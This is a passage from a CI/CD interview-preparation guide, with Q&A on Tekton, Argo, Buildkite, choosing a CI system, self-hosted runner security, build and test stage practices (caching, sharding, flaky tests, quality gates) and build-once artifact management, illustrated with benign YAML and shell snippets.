- **TaskRun/PipelineRun** — an actual execution instance.

Because everything is a CRD, your pipelines are just Kubernetes objects — reconciled by controllers, scaled by the cluster, secured by RBAC, observed by your existing K8s tooling. Each step is a container, so builds are naturally isolated and reproducible.

The key difference: Tekton is a **low-level building block, not a finished product**. It has no built-in triggers-from-Git UX, dashboards, or opinionated defaults out of the box (Triggers and Dashboard are separate components). Vendors build higher-level products *on top* of Tekton (e.g. Jenkins X, Red Hat OpenShift Pipelines). You pick Tekton when you're all-in on Kubernetes and want CI to be native cluster resources rather than an external system pushing `kubectl`.

### Q10. What are Argo Workflows, and how do they relate to Argo CD?

**Argo Workflows** is a Kubernetes-native workflow engine: you define a DAG (or sequential steps) where **each step runs as a pod/container**. It's general-purpose — used for CI, data pipelines, ML training, batch jobs — anything you'd model as a container DAG on Kubernetes.

```yaml
apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata: { generateName: build- }
spec:
  entrypoint: main
  templates:
    - name: main
      dag:
        tasks:
          - name: build
            template: run
          - name: test
            template: run
            dependencies: [build]
```

The Argo family often confuses people:

- **Argo Workflows** — workflow/CI engine (DAG of containers).
- **Argo CD** — GitOps **continuous delivery** controller (pulls desired state from Git, reconciles the cluster).
- **Argo Events** — event-driven triggers (a webhook/Kafka message kicks off a Workflow).

They compose: Argo Events triggers a Workflow (build/test/push artifact), which updates a Git manifest, which Argo CD then reconciles into the cluster. Workflows is the CI side; Argo CD is the CD side.

### Q11. What is Buildkite and what problem does its hybrid model solve?

**Buildkite** splits CI into two halves:

- **SaaS control plane** — Buildkite hosts the orchestration, pipeline UI, scheduling, and logs.
- **Self-hosted agents** — *you* run the agents, on your own infrastructure (your VMs, your Kubernetes, your cloud).

This **hybrid model** is its whole value proposition. You get a managed, no-server-to-run control plane, but the compute that checks out your source and holds your secrets **never leaves your infrastructure** — the Buildkite cloud never sees your code. That makes it attractive for:

- **Security/compliance** — source and secrets stay in your network; only metadata goes to the SaaS.
- **Scale and cost** — run thousands of your own cheap/spot agents instead of paying per-minute for vendor compute.
- **Custom hardware** — GPUs, big machines, specific OSes you control.

It's the sweet spot between "fully managed but your code goes to the vendor" (CircleCI/Actions cloud) and "self-host everything including the control plane" (Jenkins).

### Q12. Compare the major managed CI options: what do the cloud vendors offer?

The big cloud providers bundle CI/CD to keep you in their ecosystem:

| Platform | Config | Notes |
|---|---|---|
| **Azure DevOps Pipelines** | `azure-pipelines.yml` | Mature, strong Windows/.NET story, integrates with Azure Boards/Repos/Artifacts; Microsoft-hosted or self-hosted agents. |
| **AWS CodePipeline + CodeBuild** | Console/CDK/CloudFormation + `buildspec.yml` | CodePipeline orchestrates stages; CodeBuild runs the builds. Deep AWS/IAM integration, but clunkier DX and more assembly than VCS-native tools. |
| **Google Cloud Build** | `cloudbuild.yaml` | Container-native, tight GCP/Artifact Registry integration. |

The trade-off with vendor CI/CD is **lock-in vs integration depth**: you get seamless IAM, artifact registries, and deploy targets within that cloud, at the cost of portability and (often) a less pleasant developer experience than GitHub Actions or GitLab. Teams heavily invested in one cloud sometimes pick these for the IAM/deploy integration; teams that value DX and portability usually prefer VCS-integrated CI and deploy *to* the cloud from there.

### Q13. What are the key decision axes when choosing a CI system?

Don't ask "which is best" — evaluate against constraints:

- **Managed SaaS vs self-hosted** — do you *want* to run servers? Regulated/air-gapped environments often *must* self-host (source can't leave the network).
- **Execution substrate** — VM-based vs container-native vs Kubernetes-native. If you already run everything on K8s, Tekton/Argo are natural; if not, they're overhead.
- **VCS integration** — is the pipeline next to the code with one permission model (Actions/GitLab), or a separate system to wire up and authorize (Jenkins)?
- **Ecosystem/marketplace** — reusable actions/orbs/plugins reduce boilerplate but add supply-chain risk.
- **Cost model** — per-minute SaaS billing vs self-hosted compute *plus the humans* who maintain it. At scale, self-hosted/hybrid often wins on price.
- **Security & compliance** — where do secrets and source live? What does your auditor require?
- **Lock-in** — how portable is the pipeline definition if you need to leave?

The senior move is naming these axes and reasoning from *your* constraints, not reciting a favorite tool.

### Q14. "Which CI system would you choose and why?" — walk me through it.

There's no single right answer; there's a right *method*. I'd anchor on constraints:

- **Already on GitHub, general web/app team** → **GitHub Actions**. Pipeline next to the code, one permission model, huge marketplace, OIDC to the cloud — lowest friction, and I don't run a server.
- **Already on GitLab** → **GitLab CI** for the same integration reasons, plus built-in registry and environments.
- **Regulated / air-gapped / source can't leave the network** → **self-hosted** — GitLab self-managed, Jenkins, or **Buildkite** (SaaS control plane, self-hosted agents so code stays in-house).
- **All-in on Kubernetes, want CI as native cluster resources** → **Tekton/Argo**, paired with **Argo CD** for GitOps delivery.
- **Large legacy Jenkins estate** → keep it running, but strangler-fig new repos onto Actions/GitLab and migrate incrementally rather than a risky big-bang rewrite.

Then I'd state the non-negotiables regardless of tool: **pipeline-as-code**, least-privilege secrets/OIDC, isolated runners, and **build-once/promote-the-same-artifact**. The tool is swappable; those principles aren't.

### Q15. What's the security risk with self-hosted runners/agents, and how do you mitigate it?

A self-hosted runner/agent executes arbitrary build code and holds access to your network and secrets. The danger cases:

- **Shared runners on public repos** — a malicious PR can run code on your runner. If runners are non-ephemeral, one build can **poison the next** (leave a backdoor, tamper with tooling, steal cached credentials).
- **Over-privileged runners** — a runner with broad cloud/network access is a lateral-movement launchpad if compromised.
- **Internet-exposed controllers** (Jenkins) — a huge attack surface holding all credentials.

Mitigations:

- **Ephemeral runners** — one job per runner, destroyed after (fresh VM/pod each time). Kills cross-build contamination.
- **Isolation** — run in disposable containers/microVMs, on isolated networks, with no standing access to prod.
- **Least privilege** — scope credentials tightly; prefer short-lived **OIDC** tokens over long-lived cloud keys.
- **Never run untrusted fork PRs on privileged runners** — require approval before running workflows from forks; keep secrets out of fork-triggered builds.
- **Patch and audit** — keep the agent and (for Jenkins) plugins current; the controller runs no build workloads.

"Self-hosted" is only more secure if you actually isolate it; a shared, over-privileged, persistent runner is *less* secure than a managed one.

## Build & Test Stages

### Summary

**What this topic covers**

The heart of the CI pipeline: turning a commit into a validated, deployable artifact — fast, reliably, and cheaply. The 16 questions here cover the **build stage** (compile/bundle once to produce the deployable), the **test pyramid in CI** (many fast unit tests, fewer integration, few slow e2e — cheapest and fastest first), **parallelization and sharding** to cut wall-clock time, **dependency and layer caching** (usually the single biggest CI speedup), **flaky tests** (why they poison trust and how to handle them), **quality gates** (coverage, static analysis, linting, type-checks — and the risk of gates that are too strict), test reporting/annotations, hermetic and reproducible builds, build matrices, and **incremental/affected builds** in a monorepo. The recurring theme: **fast, trustworthy feedback**. A slow or flaky pipeline is worse than no pipeline, because engineers learn to ignore or route around it.

**Mental model**

A commit enters the pipeline and moves through stages ordered by **cost and speed**: cheap, fast checks first (lint, type-check, unit tests) so a broken build fails in seconds, not after a 30-minute e2e run. Picture the **test pyramid** running left-to-right in time — a wide base of fast unit tests gates the merge, a narrower band of integration tests runs next, and a thin cap of slow e2e/smoke tests runs last (often post-merge or pre-deploy). Two forces fight the clock: **parallelization** (split work across runners) and **caching** (don't redo work — reuse dependencies and build layers). The single most important discipline is **build the artifact once**: the build stage produces *the* deployable, and every downstream stage tests *that exact artifact*, not a fresh rebuild from source. And the silent killer is the **flaky test** — a test that passes and fails nondeterministically erodes trust until people rerun-until-green or ignore red, at which point the pipeline stops protecting you. Optimize for *feedback latency* and *signal trustworthiness*, in that order.

**Key terms**

- **Build stage** — compile/bundle source into the deployable artifact (jar, binary, container image, bundle). Done once; the output feeds all downstream stages.
- **Test pyramid** — many fast unit tests, fewer integration, few slow e2e. Cheapest/fastest first.
- **Sharding / test splitting** — dividing a test suite across parallel jobs, ideally balanced by historical timing.
- **Build matrix** — running the same build across combinations (language versions, OSes) in parallel.
- **Dependency cache** — persisting `~/.m2`, `node_modules`/npm cache, Go/pip caches between runs to skip re-download/rebuild.
- **Docker layer cache** — reusing unchanged image layers so only what changed rebuilds.
- **Flaky test** — a test with nondeterministic pass/fail results independent of code changes.
- **Quality gate** — an automated pass/fail threshold (coverage %, no new critical issues, lint clean) that blocks the build.
- **SAST / static analysis** — analyzing code without running it (linters, type-checkers, security scanners like SonarQube/CodeQL).
- **Fail-fast** — abort the pipeline on first failure vs collecting all failures before reporting.
- **Hermetic / reproducible build** — a build that depends only on declared inputs and yields byte-identical output from the same inputs.
- **Affected/incremental build** — in a monorepo, building/testing only what a change actually touches (Nx/Bazel/Turborepo).

**Why interviewers ask this**

This is where CI competence is really measured. A junior engineer can add a `test:` job; a senior engineer makes a 40-minute pipeline run in 8 by caching and sharding, keeps it *trustworthy* by hunting flaky tests, and designs quality gates that catch regressions without becoming noise everyone ignores. Interviewers listen for the reflexes: "build once, test the artifact," "cache dependencies," "run fast checks first," "quarantine flaky tests, don't blanket-retry." They'll probe judgment on gates — can you tell the difference between a coverage gate that protects quality and one that just makes people write assertion-free tests to hit a number? And they'll test whether you treat pipeline speed as a real engineering problem (it directly sets how fast the whole team ships) rather than an afterthought.

**Common confusions**

- "More tests = better CI" — not if they're slow or flaky. A fast, trustworthy subset beats a huge suite everyone bypasses.
- "Just retry flaky tests until they pass" — retries hide the flake and can mask real intermittent bugs; retry is a stopgap, fixing/quarantining is the answer.
- "Rebuild in each stage/environment" — no; **build once, test and deploy the same artifact**. Rebuilding risks a different result.
- "100% coverage means well-tested" — coverage measures execution, not assertion quality; you can have 100% coverage with worthless tests.
- "Parallelizing always helps" — only if jobs are independent and balanced; naive splits leave one shard running long while others idle.
- "Caching is set-and-forget" — a wrong cache key serves stale deps or silently never hits; caches need correct keys and occasional invalidation.

**What follows from this topic**

The build stage's output is the subject of the next topic, **Artifacts & Artifact Management** — the immutable thing you build once and promote. The quality gates here (SAST, coverage, signing prep) connect to supply-chain security and provenance. Fast, trustworthy build/test is the precondition for **Continuous Deployment**: you can't safely auto-ship on green if green isn't reliable. Get feedback fast and make it trustworthy, and everything downstream — delivery, deployment strategies, rollback — gets safer.

### Q1. Walk me through what the "build stage" actually does and why it matters.

The **build stage** transforms source into the **deployable artifact**: compile the code, bundle/transpile assets, resolve dependencies, and package the result — a jar, a native binary, a container image, an npm tarball, a zip. Its output is *the* thing you'll deploy.

Why it's the linchpin:

- **Build once, exactly once.** The artifact the build produces is what every downstream stage (test, security scan, staging, prod) uses. You do **not** rebuild in later stages or per environment — that risks producing a *different* artifact and breaks reproducibility.
- **Fail early.** A compile error or dependency-resolution failure here is the cheapest possible failure — seconds in, before any expensive testing or deployment.
- **It defines the unit of everything after.** Versioning, provenance, promotion, rollback all attach to this artifact.

A good build stage is fast (cached), deterministic (hermetic — same inputs, same output), and produces one immutable, versioned artifact that flows through the rest of the pipeline unchanged.

### Q2. Explain the test pyramid in the context of a CI pipeline.

The **test pyramid** describes the ideal *shape* of a test suite, and CI is where that shape pays off:

- **Base — unit tests** (many, milliseconds, no I/O). They test individual functions/classes in isolation. Run them **first** on every push; they give feedback in seconds and gate merges.
- **Middle — integration tests** (fewer, seconds, real DB/service via containers). They verify components work together. Run after units pass.
- **Top — e2e tests** (few, slow, brittle, whole-system). They validate critical user journeys. Run last — often post-merge, nightly, or as pre-deploy smoke checks — because they're expensive and flakier.

In CI you **order stages by cost and speed**: cheap and fast first so a broken build fails quickly, expensive and slow last. Anti-pattern is the **ice-cream cone** — mostly slow e2e tests and few unit tests — which makes CI slow, flaky, and expensive. Push test coverage down the pyramid: prefer a fast unit test to a slow e2e whenever it can catch the same bug.

### Q3. How do you speed up a slow test suite with parallelization and sharding?

Two levers: run more at once, and split the big thing.

- **Parallel jobs** — independent stages (lint, unit, type-check) run concurrently on separate runners.
- **Sharding / test splitting** — divide one big suite across N runners so wall-clock time drops roughly N×. The naive split (by file count) leaves shards unbalanced; the good split is **by historical timing** so each shard takes about the same time.

```yaml
# GitHub Actions: shard a suite across 4 runners
jobs:
  test:
    strategy:
      matrix:
        shard: [1, 2, 3, 4]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npx jest --shard=${{ matrix.shard }}/4
```

Caveats: shards must be **independent** (no shared mutable state/order dependence), and there's fixed per-job overhead (spin-up, dependency install) — over-sharding a small suite wastes more on setup than it saves. Balance shard count against that overhead, and cache dependencies so each shard doesn't reinstall from scratch.

### Q4. What's the biggest lever for CI speed? (Hint: caching.)

**Caching dependencies and build layers** is usually the single biggest speedup — most CI time is spent re-downloading and rebuilding things that didn't change.

- **Dependency caches** — persist the package manager's store between runs: `~/.m2` (Maven), Gradle cache, `node_modules`/npm cache, `~/.cache/pip`, Go module cache. Key the cache on the **lockfile hash** so it invalidates only when dependencies actually change.
- **Docker layer cache** — order your Dockerfile so dependency install (rarely changes) comes *before* copying source (changes every commit); unchanged layers are reused and only the app layer rebuilds. Use registry-backed layer caching (BuildKit `--cache-from`) so the cache survives across ephemeral runners.
- **Build/compilation caches** — Gradle build cache, ccache, Bazel remote cache, Turborepo remote cache.

```yaml
- uses: actions/setup-node@v4
  with:
    node-version: 20
    cache: npm          # keyed on package-lock.json automatically
- run: npm ci
```

The critical detail is the **cache key**: too broad and you serve stale deps; too narrow and you never hit. Key on the lockfile, and let it fall back to a partial-match restore key for a warm-but-not-perfect cache.

### Q5. What is a flaky test and why is it so damaging to CI?

A **flaky test** passes and fails **nondeterministically** — same code, different result, run to run. Common causes: timing/race conditions, reliance on wall-clock time, test-order dependence, shared mutable state, network/external-service dependence, unseeded randomness.

Why they're poison:

- **They destroy trust in red.** Once "the build is probably just flaky" becomes the reflex, people **rerun until green** or merge past red — and now a *real* failure gets ignored too. The pipeline stops being a safety net.
- **They waste time and money** — reruns burn CI minutes and human attention.
- **They mask real bugs** — a flake might actually be a genuine intermittent race in the *product*, not just the test.

The damage is disproportionate: even a small percentage of flaky tests, across thousands of runs, means the suite rarely goes green on the first try, and confidence collapses. A trustworthy pass/fail signal is the entire point of CI — flakes attack that directly.

### Q6. How do you deal with flaky tests?

A staged strategy, not a blanket retry:

1. **Detect** — track pass/fail history per test. A test that flips without code changes is flaky. Many platforms and tools (and rerun-based detectors) surface flake rate; make it visible on a dashboard.
2. **Quarantine** — move a known-flaky test out of the blocking gate (tag/skip it in the required run) so it stops blocking merges, but **file a ticket** and keep running it in a non-blocking lane. Quarantine is a pressure-release valve, not a graveyard.
3. **Fix the root cause** — remove timing assumptions (wait on conditions, not `sleep`), eliminate order-dependence and shared state, seed randomness, stub external services. Push the test down the pyramid if it's a slow e2e that could be a stable unit test.
4. **Retry — sparingly, as a stopgap.** Automatic retry (e.g. rerun a failed test up to 2×) gets you unblocked, but it **hides** the flake and can mask genuine intermittent product bugs. Only ever combine retry with tracking so flakes still get fixed, not silently swallowed.

The order matters: detect and quarantine to protect trust *now*, fix to remove the problem, retry only as a temporary crutch.

### Q7. What are quality gates and how do you design them well?

**Quality gates** are automated pass/fail thresholds that block the build when quality regresses: minimum test coverage, no new critical static-analysis findings, lint clean, type-check clean, no high-severity vulnerabilities, no drop from the previous baseline.

Designing them well is a balancing act:

- **Gate on regressions, not absolutes.** "No *new* uncovered lines / no *new* critical issues" is far better than "must hit 90% coverage globally" — the latter punishes people for touching legacy code and invites gaming.
- **Make failures actionable.** A gate must tell you exactly what failed and where (annotations on the PR), or people just rubber-stamp overrides.
- **Beware over-strict/noisy gates.** A gate that fails constantly for trivial reasons trains everyone to bypass it — a gate people ignore is worse than no gate. Tune signal-to-noise.
- **Fast gates block merges; slow ones inform.** Lint/type/unit gate the merge; expensive scans can run async and file issues rather than block.

The goal is gates that **catch real regressions with minimal false positives** — protective, not obstructive.

### Q8. Coverage thresholds: useful or vanity metric?

Both, depending on how you use them.

**The trap:** coverage measures *which lines executed during tests*, not *whether the tests assert anything meaningful*. You can hit 100% coverage with tests that call code and assert nothing. A hard global threshold (e.g. "90% or the build fails") often just pressures people to write assertion-free tests to make the number go up — Goodhart's law in action.

**Using it well:**

- **Gate on coverage of the diff**, not the whole repo — "new/changed code must be covered." This catches untested new logic without demanding you retro-test the whole legacy codebase.
- **Treat it as a floor and a trend**, not a target. Watch for *drops*; don't obsess over the last few percent.
- **Pair it with mutation testing** if you want to measure test *quality* (does the test actually fail when the code is broken?), which coverage can't.

In an interview: acknowledge coverage is a useful *signal* and a terrible *target*, and gate on new-code coverage rather than a global number.

### Q9. Fail-fast vs collecting all failures — which and when?

Both have a place:

- **Fail-fast** — abort the pipeline (and cancel sibling matrix jobs) on the first failure. Saves time and compute — no point running a 20-minute e2e suite if compilation already failed. Good default for **stages ordered by cost** and for expensive matrix builds.
- **Collect all failures** — let independent checks all run and report every failure at once. Better developer experience for **parallel independent checks** (lint + type-check + unit): a dev fixes everything in one pass instead of the whipsaw of fix-one-see-the-next.

Practical answer: **fail-fast across sequential expensive stages** (don't run e2e if build fails), but **let independent parallel checks all complete** so the developer sees the full list. GitHub Actions gives per-matrix control:

```yaml
strategy:
  fail-fast: false     # let every matrix leg finish and report
  matrix:
    node: [18, 20, 22]
```

Use `fail-fast: true` (default) to cancel siblings when one leg fails and you just need *a* signal; `false` when you want the complete failure picture across the matrix.

### Q10. How should test results surface in CI? (reporting and annotations)

Raw logs are the worst way to consume test failures. Good pipelines **structure and surface** results:

- **Standard report formats** — most test runners emit **JUnit XML** (or similar). CI platforms ingest it to show a pass/fail summary, per-test timing, and failure details in the UI instead of forcing a log scroll.
- **Inline PR annotations** — surface the failing test, assertion, and file/line **directly on the pull request diff**, so the author sees exactly what broke without digging.
- **Trends** — track suite duration and flake rate over time so slow-downs and flakiness are visible, not discovered by accident.
- **Coverage and quality reports** — post coverage diff and static-analysis findings as PR comments/checks.

```yaml
- name: Test
  run: pytest --junitxml=results.xml
- name: Publish report
  if: always()          # publish even when tests failed
  uses: mikepenz/action-junit-report@v4
  with:
    report_paths: results.xml
```

Note `if: always()` — you must publish the report **even when tests fail**, otherwise you only get reports for green runs, which is exactly backwards.

### Q11. What is static analysis in CI, and where does it fit?

**Static analysis** inspects code **without running it** — and it's the cheapest, fastest layer of the testing trophy, so it runs early:

- **Linters** — style and common-bug checks (ESLint, RuboCop, golangci-lint).
- **Type checkers** — `tsc`, mypy, Flow — catch whole classes of bugs before tests even run.
- **SAST (static application security testing)** — scan for security vulnerabilities in code (CodeQL, Semgrep, SonarQube, Bandit).
- **Dependency/SCA scanning** — flag known-vulnerable dependencies (Dependabot, `npm audit`, Snyk, Trivy).

Placement: run these **first**, in parallel, before or alongside unit tests. They're fast and catch bugs cheaply — a type error or a hardcoded-secret finding should fail the build in seconds. Treat their findings as quality gates (block on *new* critical issues, ideally on the diff), and surface them as PR annotations. Static analysis is the highest ROI-per-second in the pipeline: no execution, no flakiness, and it catches real defects and security issues before anything expensive runs.

### Q12. Why must you test the built artifact rather than rebuild from source in each stage?

Because the whole point of the pipeline is confidence that **the exact bytes you'll deploy** are the bytes you tested.

If each stage rebuilds from source:

- **You might get a different artifact.** Non-hermetic builds pull "latest" of some transitive dependency, a different compiler/base-image version, or a different timestamp — so the thing you tested in staging isn't the thing you ship to prod.
- **You lose reproducibility and provenance.** "Which build did we test?" has no single answer if there are five builds.
- **You waste time** rebuilding the same thing repeatedly.

The rule is **build once, then promote the same artifact**: the build stage produces one immutable, versioned artifact; test runs against *it*; staging deploys *it*; prod deploys the *same* it (ideally pinned by content digest). Config that differs per environment is injected at deploy time — the artifact itself never changes. This is the bridge into the Artifacts topic and the single most important reproducibility discipline in CI/CD.

### Q13. What are hermetic and reproducible builds, and why do they matter?

- **Hermetic build** — the build depends **only on explicitly declared inputs** (pinned sources, pinned dependencies, pinned toolchain) and is sealed off from the ambient environment: no reaching out to the network mid-build, no "whatever compiler happens to be on the runner," no system clock leaking in.
- **Reproducible build** — given the same inputs, it produces **byte-identical output** every time, on any machine.

Why they matter:

- **Trust and provenance** — if the build is reproducible, anyone can rebuild from the same commit and verify they get the identical artifact — the foundation of supply-chain security (SLSA, verifiable provenance).
- **Reliability** — no "works on my machine / green yesterday, red today with no code change" from environmental drift.
- **Better caching** — deterministic inputs mean cache keys are meaningful and hits are safe.

Tools like **Bazel** and **Nix** enforce hermeticity by construction (sandboxed, fully declared deps). Even without them, you get closer by pinning dependency versions (lockfiles), pinning base-image digests, and pinning the toolchain version rather than floating tags.

### Q14. What is a build matrix and when do you use one?

A **build matrix** runs the same pipeline across combinations of parameters **in parallel** — the canonical use is verifying your code works across multiple environments:

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, macos-latest, windows-latest]
    node: [18, 20, 22]
# → 9 parallel jobs, one per (os, node) pair
```

Use it when you must **support multiple targets**: language/runtime versions (Node 18/20/22, Python 3.10–3.12), operating systems, database versions, or architectures (amd64/arm64). It's essential for **libraries and OSS** that must work across the versions their users run.

Watch-outs: the matrix **multiplies out** (3 OSes × 3 versions = 9 jobs), so it can explode cost and runner usage — `exclude` combinations you don't support, and consider testing the full matrix on merge/nightly but only the primary combo on every push. For an *app* (which runs in exactly one known environment in prod), a wide matrix is usually wasted effort — test the environment you actually ship.

### Q15. In a monorepo, how do you avoid rebuilding everything on every change?

With **affected/incremental builds** — only build and test what a change actually touches. In a large monorepo, running the entire build/test suite for a one-line change to one service is slow and wasteful.

The approach: model the repo as a **dependency graph** of projects, determine which files changed, and compute the **affected set** (changed projects plus everything downstream that depends on them), then build/test only that set.

Tools:

- **Nx** — `nx affected --target=test` computes affected projects from the graph and the git diff.
- **Turborepo** — task graph + content-hash caching; unchanged tasks are restored from cache instead of rerun.
- **Bazel** — precise, hermetic dependency graph; only rebuilds targets whose inputs changed, with a remote cache shared across the team/CI.

```bash
# Only test projects affected by the changes since main
npx nx affected --target=test --base=origin/main
```

Combine affected-detection with **remote caching** so even the affected work is skipped if someone (or a previous CI run) already built that exact input. Done right, a change to one service triggers a build/test of just that service and its dependents, keeping monorepo CI fast regardless of repo size.

### Q16. How do you order tests for the fastest useful feedback?

Order by **cost and likelihood of catching the failure** — you want the pipeline to fail as fast as possible when something's wrong:

1. **Static checks first** — lint, type-check, format. Milliseconds, no execution, catch trivial breakage before anything runs.
2. **Unit tests** — fast, isolated, catch most logic bugs. Gate the merge on these.
3. **Integration tests** — slower, need real dependencies (DB/services via containers). Run after units pass.
4. **e2e / smoke tests** — slowest and flakiest. Run last, often post-merge or pre-deploy.

Two refinements:

- **Order by speed within a stage** so the quickest checks report first.
- **Run recently-failing / changed-area tests first** — some frameworks support test **prioritization** (run tests most likely to fail, based on history or code proximity, earliest), so a likely failure surfaces in seconds rather than at the end.

The principle is **fail-fast on the cheapest possible signal**: never make a developer wait 20 minutes for an e2e run to discover a lint error or a broken unit test that a 10-second check would have caught.

## Artifacts & Artifact Management

### Summary

**What this topic covers**

The **artifact** — the immutable output of the build and the actual unit of deployment — and everything about managing it well. The 15 questions here cover what a build artifact is, the cardinal rule to **build once and promote the same artifact** through environments, the difference between short-lived **pipeline artifacts** (passed between CI jobs) and long-lived **artifact repositories** (Artifactory, Nexus, registries), **immutability and versioning** (never overwrite a published version; the `:latest` trap), **promotion** (moving/tagging an artifact from staging to release), **retention/cleanup** policies, **provenance and metadata** (SLSA, attestations, SBOMs), **signing** (cosign) and pinning by digest, **dependency proxying** (a repo as a pull-through cache), and the 12-factor discipline of keeping **environment config out of the artifact**. The whole topic hangs on one idea: the artifact is the immutable, versioned, verifiable thing you build once and move — unchanged — toward production.

**Mental model**

Think of the artifact as a **sealed, labeled shipping container**. Once the build seals it, you never open and repack it — you move the *same* container from dev to staging to prod. Everything that varies per environment (database URLs, feature flags, secrets) is *not* packed inside; it's injected at the destination when the container is opened for deployment. This is the **build-once/promote-many** model, and its opposite — rebuilding per environment — is the cardinal sin, because a rebuild might produce a *different* container, so you'd be shipping something you never tested. The artifact needs three properties to be trustworthy: it's **immutable** (a given version's bytes never change), **uniquely identified** (versioned by semver and/or git-sha and/or a content **digest** that IS the bytes), and **traceable** (provenance says exactly which commit, which build, which inputs produced it — ideally signed so you can verify authenticity). Promotion is then either physically copying the artifact to a "release" repository or, better, just **referencing the same immutable digest** and changing which environment points at it. The artifact is the currency of the whole pipeline; guard its integrity.

**Key terms**

- **Build artifact** — the immutable output of the build you actually deploy: a jar, native binary, container image, npm/PyPI package, or zip.
- **Build once, promote the same artifact** — the cardinal rule: build the deployable exactly once, then promote *that byte-identical artifact* through dev → staging → prod. Never rebuild per environment.
- **Pipeline artifact** — short-lived output passed between CI jobs in one run (GitHub/GitLab "artifacts"); auto-expires.
- **Artifact repository** — long-lived, versioned storage: JFrog Artifactory, Sonatype Nexus, GitHub Packages, container registries (GHCR/ECR), language registries (npm/PyPI/Maven Central).
- **Immutability** — a published version is never overwritten. `1.2.3` always means the same bytes.
- **Content digest** — a cryptographic hash of the artifact (e.g. `sha256:…`) that both identifies and verifies it. Pinning by digest is the strongest reference.
- **`:latest` trap** — a mutable tag that points at different bytes over time — non-reproducible and unsafe for deploys.
- **Promotion** — copying/tagging an artifact from a snapshot/staging repo into a release repo, or simply repointing an environment at the same digest.
- **Provenance / attestation** — verifiable metadata about how/from-what an artifact was built (**SLSA**).
- **SBOM** — Software Bill of Materials: the full list of components/dependencies in the artifact.
- **Signing** — cryptographically signing the artifact (**cosign**) so consumers verify authenticity and integrity.
- **Pull-through cache / proxy** — an artifact repo mirroring a public registry, for speed, resilience, and control.

**Why interviewers ask this**

Artifact discipline separates people who've *operated* a delivery pipeline from those who've only added CI jobs. The single most revealing question is "how does the same code reach prod?" — a strong candidate immediately says "we build one artifact and promote *that*," and can explain *why* rebuilding per environment is dangerous (non-reproducibility: you deploy something you never tested). Senior signal shows up in the details: immutable versioning and rejecting the `:latest` trap, pinning deploys by digest, keeping config out of the artifact (12-factor), and modern supply-chain awareness — provenance/SLSA, SBOMs, and signing with cosign. It also probes ops maturity: retention policies (artifacts eat storage), dependency proxying for resilience, and using an artifact repository rather than passing files around ad hoc. It's a compact way to test reproducibility, security, and operational thinking at once.

**Common confusions**

- "Rebuild for prod so it's optimized/fresh" — no; rebuilding breaks reproducibility. **Build once, promote the same bytes.**
- "Pipeline artifacts and an artifact repository are the same" — they're not: pipeline artifacts are ephemeral intra-run handoffs; artifact repos are durable, versioned stores.
- "Deploying `:latest` is fine" — `:latest` is mutable and non-reproducible; you can't tell what's actually running or roll back deterministically.
- "Version by rebuilding with the env baked in" — config belongs *outside* the artifact, injected at deploy.
- "Storage is free, keep everything" — artifacts are large and accumulate fast; without retention/GC, registries balloon in cost.
- "A tag uniquely identifies an image" — only a **digest** does; tags are mutable pointers.

**What follows from this topic**

The artifact is the object every deployment strategy acts on — blue-green, canary, and rolling deploys all move *this* immutable, digest-pinned artifact into production. Provenance, SBOMs, and signing connect to supply-chain security and the SLSA framework. Keeping config out of the artifact is what makes the *same* artifact promotable across environments, which is the precondition for trustworthy Continuous Delivery/Deployment. Get artifact management right and "build once, promote, deploy the exact thing you tested, roll back by repointing at the previous digest" becomes the natural shape of your whole delivery pipeline.

### Q1. What is a build artifact?

A **build artifact** is the **immutable output of the build stage** — the concrete, packaged thing you actually deploy or distribute. Depending on the stack, it's a:

- **jar/war** (JVM), **native binary** (Go/Rust/C++),
- **container image** (the most common modern unit),
- **language package** — npm tarball, Python wheel, NuGet, gem,
- **zip/tarball** of a built frontend or a Lambda bundle.

The key properties that make it an *artifact* (not just "some build output"): it's the **deployable unit** (what moves toward prod), it's **immutable** (its bytes are fixed once built), and it's **versioned/identifiable** (a name + version, ideally a content digest). Everything downstream in the pipeline — testing, scanning, promotion, deployment, rollback — operates on this single object. It's the noun the whole CD process is built around.

### Q2. Explain "build once, promote the same artifact." Why is it the cardinal rule?

You **build the deployable artifact exactly once**, then **promote that identical artifact** through your environments: dev → staging → prod. The bytes never change; only *where it's deployed* changes.

Why it's non-negotiable:

- **Reproducibility / test integrity.** The artifact you tested in staging is the *exact same bytes* you ship to prod. If you rebuild for prod, you might get a **different** artifact (a floated transitive dep, a newer base image, a different compiler) — and now you're deploying something you **never tested**. That's how "it passed staging but broke prod" happens.
- **Traceability.** One artifact, one version, one provenance record — you can say precisely what's running.
- **Fast, safe rollback.** Roll back by repointing prod at the previous artifact's digest — it's known-good because it literally ran before.
- **Efficiency.** Build once instead of N times.

Rebuilding per environment is the cardinal sin because it silently reintroduces variability at exactly the moment (prod) you can least afford a surprise. Build once; promote the same artifact; inject per-environment config at deploy.

### Q3. What's the difference between pipeline artifacts and an artifact repository?

They solve different problems and have different lifespans:

| | Pipeline artifact | Artifact repository |
|---|---|---|
| **Purpose** | Pass files between jobs in **one CI run** | Durable, versioned **storage** of releasable artifacts |
| **Lifespan** | Short-lived (auto-expire, e.g. days) | Long-lived (governed by retention policy) |
| **Examples** | GH Actions `upload/download-artifact`, GitLab `artifacts:` | JFrog Artifactory, Sonatype Nexus, GitHub Packages, container registries |
| **Scope** | Intra-pipeline plumbing (build job → test job) | The system of record for deployables and dependencies |

**Pipeline artifacts** are transient handoffs — the build job produces a jar, uploads it, and the test/deploy jobs download it *within the same run* so you don't rebuild. They expire.

**Artifact repositories** are the durable home for the artifacts you actually release and the dependencies you consume — versioned, access-controlled, retained, and referenced by deploys long after the pipeline run is gone. In practice: use pipeline artifacts to move the build output between jobs, and *publish* the final artifact to a repository/registry for durable storage and deployment.

```yaml
# Pipeline artifact handoff (build → test), same run
- uses: actions/upload-artifact@v4
  with: { name: app-jar, path: build/app.jar }
# ... later job ...
- uses: actions/download-artifact@v4
  with: { name: app-jar }
```

### Q4. Why must artifacts be immutable, and how do you version them?

**Immutability** means a published version's bytes are **never overwritten**. `app:1.2.3` today is the same `app:1.2.3` next year. This is what makes reproducibility, reliable rollback, and trustworthy provenance possible — if a version could change under you, "deploy 1.2.3" would be meaningless.

Versioning schemes (often combined):

- **Semver** (`1.4.2`) — human-meaningful, communicates compatibility. Good for libraries and releases.
- **Git SHA** (`app:git-a1b2c3d`) — ties the artifact directly to the exact commit; great traceability, unambiguous.
